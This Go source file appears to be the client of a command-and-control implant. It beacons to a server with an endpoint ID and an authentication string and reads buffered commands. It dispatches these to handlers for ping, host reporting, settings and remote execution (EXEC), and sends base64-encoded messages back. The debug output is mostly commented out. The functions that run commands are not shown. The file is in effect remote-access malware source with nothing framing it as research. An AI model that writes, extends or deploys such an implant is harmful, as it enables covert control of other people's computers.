package main

import (
	"bufio"
	"encoding/base64"
	"fmt"
	"net"
	"os"
	"strings"
)

// Client hostname is the hostname of the machine running the client
// conn is the net.Conn interface, allows reading and writing of networked data
// cmdBuff is the number of commands the server has buffered for this client. This data is received upon beaconing the server
type Client struct {
	endpointId string
	hostname   string
	conn       net.Conn
	cmdBuff    int
	beaconRate int
	authString string
}

func newClient() *Client {
	host, _ := os.Hostname()
	return &Client{
		endpointId: EndpointID,
		hostname:   host,
		beaconRate: 3,
		authString: AuthString,
	}
}

func (c *Client) beacon() {
	defer c.conn.Close()
	c.pushMessage("BEACON", c.endpointId, c.authString)

	sReader := bufio.NewReader(c.conn)
	data, err := sReader.ReadString('\n')
	if err != nil {
		//fmt.Println(err)
		return
	}
	c.setBufferAmount(&c.cmdBuff, data)

	for i := 0; i < c.cmdBuff; i++ {
		data, err := sReader.ReadString('\n')
		if err != nil {
			//fmt.Println(err)
			return
		}
		//fmt.Println("RECV: " + data)
		c.handleData(data)
	}
}

func (c *Client) handleData(data string) {
	msgArgs := strings.Split(data, "\x02")
	// Trim off "\n" from the last argument
	msgArgs[len(msgArgs)-1] = strings.TrimSuffix(msgArgs[len(msgArgs)-1], "\n")

	if msgArgs[0] == "CMD:" {
		switch strings.TrimSpace(msgArgs[1]) {
		case "PING":
			CmdPing(c)
		case "HOST":
			CmdHost(c)
		case "SET":
			CmdSet(c, msgArgs)
		case "EXEC":
			CmdExec(c, msgArgs)
		default:
			//fmt.Printf("Unsupported CMD: %s\n", msgArgs[1])
			return
		}
	}
}

func (c *Client) pushMessage(msg string, args ...string) {

	builtMsg := msg
	if len(args) > 0 {
		for _, s := range args {
			builtMsg += "\x02" + s
		}
	}

	c.conn.Write([]byte("MSG:\x02" + builtMsg + "\n"))

	fmt.Println("PUSH: " + "MSG:\x02" + builtMsg + "\n")
}

func (c *Client) PushInterMessage(msg string) {
	payload := base64.StdEncoding.EncodeToString([]byte(msg))
	c.conn.Write([]byte("IMSG:\x02" + payload + "\n"))
	//fmt.Println("PUSH: " + "IMSG:\x02" + payload + "\n")
}

func (c *Client) setBufferAmount(buffRef *int, data string) {
	msgArgs := strings.Split(data, "\x02")

	if len(msgArgs) < 2 {
		return
	}
	if msgArgs[1] != "BUF" {
		//fmt.Printf("Malformed BUF command. %s\n", data)
		return
	}

	_, err := fmt.Sscan(strings.TrimSpace(msgArgs[2]), buffRef)
	if err != nil {
		//fmt.Printf("Malformed BUF command. %s\n", data)
		//fmt.Println(err)
		return
	} else {
		//fmt.Printf("BufAmt set: %d\n", c.cmdBuff)
		return
	}
}
